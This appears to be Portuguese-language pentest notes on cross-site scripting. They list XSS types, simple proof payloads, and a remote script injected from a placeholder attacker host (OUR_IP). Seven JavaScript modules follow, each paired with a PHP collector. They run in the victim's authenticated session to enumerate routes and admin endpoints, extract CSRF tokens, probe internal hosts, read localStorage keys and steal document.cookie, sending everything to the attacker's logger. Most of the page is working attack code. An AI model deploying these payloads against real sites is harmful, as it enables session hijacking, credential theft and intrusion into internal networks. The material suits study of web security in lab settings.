---
title: Cross-Site Scripting
---
### 1. Tipos de XSS

{{< tabs items="Reflected XSS, Stored XSS, DOM-based XSS, Self-XSS" >}}

{{< tab >}}
#### **Reflected XSS**
Ocorre quando o dado enviado pelo usuário é devolvido **imediatamente** na resposta HTTP, inserido no HTML sem escaping. Qualquer interpretação direta pelo navegador resulta na execução do payload.
{{< /tab >}}

{{< tab >}}
#### **Stored XSS**

O payload é **persistido** no servidor (banco, arquivo, cache, comentário, perfil). Quando uma página carrega esse conteúdo, o navegador executa o JavaScript integrado.
{{< /tab >}}

{{< tab >}}
#### **DOM-based XSS**

O front-end manipula valores controlados pelo usuário e os insere no DOM sem validação. A vulnerabilidade está no JavaScript do cliente, não no servidor.
{{< /tab >}}

{{< tab >}}
#### **Self-XSS**

Requer que a própria vítima **digite ou cole** o código no navegador. Não é explorável remotamente.
{{< /tab >}}
{{< /tabs >}}

---
### 2. Técnicas de exploração XSS
#### **Técnica 1 — Execução Direta via `<script>`**

**Conceito:**
Usada como verificação inicial para confirmar se o navegador executa JavaScript injetado e identificar o contexto de execução (`window.origin`).

**Requisitos para execução:**

* Reflexão direta no HTML (Reflected/Stored XSS)
* Contexto **HTML** não filtrado
* `<script>` não bloqueado por WAF ou sanitização

**Exemplo:**

```html
<script>alert(window.origin)</script>
```
---
#### **Técnica 2 — Quebra Estrutural via `<plaintext>`**

**Conceito:**
Transforma todo o restante do documento em texto puro, revelando ausência de escaping ou sanitização.

**Requisitos para execução:**

* Reflexão direta em contexto HTML
* Navegador aceitando `<plaintext>` como delimitador
* Nenhum filtro removendo tags desconhecidas

**Exemplo:**

```html
<plaintext>
```
---
#### **Técnica 3 — Execução Alternativa via `print()`**

**Conceito:**
Quando `alert()` é bloqueado, `print()` confirma execução de JavaScript de forma silenciosa.

**Requisitos:**

* `<script>` permitido
* Função `print()` disponível no ambiente do navegador

**Exemplo:**

```html
<script>print()</script>
```
---
#### **Técnica 4 — Execução via Evento HTML (`onerror`)**

**Conceito:**
Abusa de eventos HTML para executar código quando `<script>` é filtrado.

**Requisitos:**

* Injeção em contexto HTML
* Elementos com atributos de evento permitidos
* `onerror` não sanitizado

**Exemplo:**

```html
<img src="" onerror=alert(window.origin)>
```
---
#### **Técnica 5 — Manipulação Direta do DOM (CSS)**

**Conceito:**
Demonstra controle programático do DOM alterando o estilo da interface.

**Requisitos:**

* Execução de JavaScript permitida
* Acesso à árvore do DOM

**Exemplo:**

```html
<script>document.body.style.background = "#141d2b"</script>
```
---
#### **Técnica 6 — Injeção de Imagem de Fundo**

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

**Requisitos:**

* Execução de JavaScript ativa
* `document.body` acessível
---
#### **Técnica 7 — Manipulação de Metadados (Título)**

**Conceito:**
Controla o título da página, útil para engenharia social.

**Requisitos:**

* Execução de JavaScript
* Acesso ao `document.title`

**Exemplo:**

```html
<script>document.title = 'HackTheBox Academy'</script>
```
---
#### **Técnica 8 — Sobrescrita Completa do Documento**

**Conceito:**
Mostra controle absoluto sobre o DOM ao substituir totalmente o conteúdo visível.

**Requisitos:**

* Execução de JavaScript
* Permissão de alterar `innerHTML`

**Exemplo:**

```html
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
```
---
#### **Técnica 9 — Remoção Cirúrgica de Elementos**

**Conceito:**
Remove elementos específicos, demonstrando controle seletivo do DOM.

**Requisitos:**

* Execução de JavaScript
* IDs acessíveis no DOM

**Exemplo:**

```html
<script>document.getElementById('urlform').remove();</script>
```
---
#### **Técnica 10 — Payload Remoto de Agente (script.js)**

Carrega um **agente externo** capaz de executar ações autenticadas, realizar recon, extrair informações e enviar telemetria.

**Requisitos gerais:**

* Execução de JavaScript
* O navegador deve conseguir carregar scripts externos
* Conectividade com o servidor do agente (`OUR_IP`)
* SameSite do cookie permitindo request a partir da página carregada

**Injeção:**

```html
<script src="http://OUR_IP/script.js"></script>
```
---
#### **Módulo A — Recon Autenticado de Superfície**

**Conceito:**
Enumera rotas internas acessíveis ao usuário e revela permissões efetivas.

**Requisitos:**

* Cookies válidos
* Endpoints acessíveis via `fetch()`

```javascript
(async () => {
  const targets = ["/", "/home.php", "/profile", "/settings", "/admin", "/api/users/me"];
  const summary = [];

  for (const path of targets) {
    try {
      const response = await fetch(path, { credentials: "include" });
      summary.push(`${path}:${response.status}`);
    } catch {
      summary.push(`${path}:ERR`);
    }
  }

  new Image().src =
    "http://OUR_IP/index.php?recon=" + encodeURIComponent(summary.join(","));
})();
```

```php
<?php
// Coletor A — Recon autenticado
$linha = date('c') . ' ' . ($_GET['recon'] ?? '') . PHP_EOL;
file_put_contents('recon.txt', $linha, FILE_APPEND);
```
**Funcionamento:**
O JavaScript percorre uma lista de rotas, faz requisições autenticadas com `credentials: "include"` e monta pares `rota:status`. Em seguida, envia esse resumo para `index.php` via uma requisição de imagem. O PHP recebe o parâmetro `recon` e registra cada linha, com timestamp, em `recon.txt`.
---
#### **Módulo B — Extração de Estruturas HTML**

**Conceito:**
Obtém valores expostos no DOM (por exemplo, tokens em campos ocultos), úteis para entender fluxos protegidos por parâmetros internos.

**Requisitos:**

* Página acessível com sessão válida
* Suporte a `DOMParser` no navegador

```javascript
(async () => {
  const response = await fetch("/home.php", {
    method: "GET",
    credentials: "include"
  });

  const html = await response.text();
  const doc = new DOMParser().parseFromString(html, "text/html");

  const token =
    doc.querySelector("input[name='csrf_token']")?.value ||
    doc.querySelector("#csrf_token")?.value ||
    "NOT_FOUND";

  new Image().src =
    "http://OUR_IP/index.php?token=" + encodeURIComponent(token);
})();
```

```php
<?php
// Coletor B — Valores extraídos do HTML
$linha = date('c') . ' ' . ($_GET['token'] ?? '') . PHP_EOL;
file_put_contents('tokens.txt', $linha, FILE_APPEND);
```
**Funcionamento:**
O JavaScript busca `/home.php`, faz o parse do HTML, extrai o valor de um campo de token e envia esse valor em `token` para o coletor. O PHP registra cada token recebido, com timestamp, em `tokens.txt`.
---
#### **Módulo C — Enumeração de Endpoints Privilegiados**

**Conceito:**
Verifica quais rotas administrativas existem e como respondem para o usuário atual, evidenciando permissões implícitas.

**Requisitos:**

* Sessão autenticada
* Endpoints administrativos acessíveis ao menos para verificação (não necessariamente autorizados)

```javascript
(async () => {
  const endpoints = [
    "/admin/panel",
    "/admin/users",
    "/admin/logs",
    "/admin/settings",
    "/api/admin/panel"
  ];

  const output = [];

  for (const ep of endpoints) {
    try {
      const resp = await fetch(ep, {
        method: "GET",
        credentials: "include"
      });

      if (resp.status !== 404) {
        output.push(`${ep}:${resp.status}`);
      }
    } catch {
      // opcional: output.push(`${ep}:ERR`);
    }
  }

  new Image().src =
    "http://OUR_IP/index.php?priv" + encodeURIComponent(output.join(","));
})();
```

```php
<?php
// Coletor C — Endpoints privilegiados
$linha = date('c') . ' ' . ($_GET['priv'] ?? '') . PHP_EOL;
file_put_contents('priv.txt', $linha, FILE_APPEND);
```
**Funcionamento:**
O JavaScript testa uma lista de rotas administrativas com a sessão da vítima e registra apenas os endpoints que não retornam 404, com seus status HTTP. O PHP recebe o parâmetro `priv` e grava o resumo em `priv.txt`.
---
#### **Módulo D — Pivot Interno (Hosts Internos)**

**Conceito:**
Usa o navegador da vítima como pivô para testar acessibilidade de hosts internos que não são expostos externamente.

**Requisitos:**

* Vítima em rede interna com acesso aos hosts alvo
* `fetch` com `mode: "no-cors"` permitido

```javascript
(async () => {
  const hosts = [
    "http://internal.local/",
    "http://internal.local/admin",
    "http://intranet/"
  ];

  const res = [];

  for (const h of hosts) {
    try {
      await fetch(h, {
        method: "GET",
        credentials: "include",
        mode: "no-cors"
      });

      res.push(`${h}:REQ_SENT`);
    } catch {
      res.push(`${h}:ERR`);
    }
  }

  new Image().src =
    "http://OUR_IP/index.php?pivot=" + encodeURIComponent(res.join(","));
})();
```

```php
<?php
// Coletor D — Pivot interno
$linha = date('c') . ' ' . ($_GET['pivot'] ?? '') . PHP_EOL;
file_put_contents('pivot.txt', $linha, FILE_APPEND);
```
**Funcionamento:**
O JavaScript tenta acessar uma lista de hosts internos usando o contexto de rede da vítima e marca cada host como `REQ_SENT` ou `ERR`. O PHP armazena esse array serializado em `pivot.txt` para posterior análise da superfície interna alcançável.
---
#### **Módulo E — Coleta de Informações do DOM**

**Conceito:**
Mapeia informações expostas no contexto do navegador (URL atual, origem, chaves de `localStorage`) que podem influenciar o comportamento da aplicação.

**Requisitos:**

* Acesso ao `window` e ao DOM
* `localStorage` disponível no contexto

```javascript
(() => {
  const data = {
    url: location.href,
    origin: location.origin,
    localStorageKeys: Object.keys(localStorage)
  };

  new Image().src =
    "http://OUR_IP/index.php?info=" + encodeURIComponent(JSON.stringify(data));
})();
```

```php
<?php
// Coletor E — Informações do DOM
$linha = date('c') . ' ' . ($_GET['info'] ?? '') . PHP_EOL;
file_put_contents('dominfo.txt', $linha, FILE_APPEND);
```
**Funcionamento:**
O JavaScript monta um objeto com informações do contexto do navegador e serializa em JSON. Esse JSON é enviado como parâmetro `info`, e o PHP grava cada linha em `dominfo.txt` para revisão posterior.
---
#### **Módulo F — Automação de Interações Autenticadas**

**Conceito:**
Executa, em lote, chamadas autenticadas para endpoints de interesse, ajudando a entender como a aplicação responde a fluxos comuns com a sessão comprometida.

**Requisitos:**

* Sessão autenticada ativa
* Endpoints válidos e acessíveis

```javascript
(async () => {
  const endpoints = [
    "/settings",
    "/messages",
    "/notifications"
  ];

  const result = [];

  for (const e of endpoints) {
    try {
      const r = await fetch(e, {
        method: "GET",
        credentials: "include"
      });

      result.push(`${e}:${r.status}`);
    } catch {
      result.push(`${e}:ERR`);
    }
  }

  new Image().src =
    "http://OUR_IP/index.php?auto=" + encodeURIComponent(result.join(","));
})();
```

```php
<?php
// Coletor F — Automação de fluxos autenticados
$linha = date('c') . ' ' . ($_GET['auto'] ?? '') . PHP_EOL;
file_put_contents('automation.txt', $linha, FILE_APPEND);
```
**Funcionamento:**
O JavaScript dispara requisições autenticadas para endpoints selecionados e registra o status de cada um. O PHP recebe o parâmetro `auto` e persiste o resumo em `automation.txt`.
---
#### **Módulo G — Exfiltração de Cookies**

**Conceito:**
Captura o conteúdo de `document.cookie` no contexto da aplicação e o envia para o coletor remoto para análise de como a aplicação gerencia sessões, flags de segurança e escopo de cookies.

**Requisitos:**

* `document.cookie` acessível (sem flag `HttpOnly`)
* Execução de JavaScript no contexto da aplicação alvo
* Conectividade com o servidor remoto

```javascript
(() => {
  const c = document.cookie || "NO_COOKIE";

  new Image().src =
    "http://OUR_IP/index.php?c=" + encodeURIComponent(c);
})();
```

```php
<?php
// Coletor G — Cookies
$linha = date('c') . ' ' . ($_GET['c'] ?? '') . PHP_EOL;
file_put_contents('cookies.txt', $linha, FILE_APPEND);
```
**Funcionamento:**
O JavaScript lê `document.cookie` e envia o valor como parâmetro `c` em uma requisição de imagem para o servidor remoto. O PHP recebe o valor e registra cada linha em `cookies.txt`, permitindo analisar posteriormente quais cookies estavam expostos ao contexto de script.
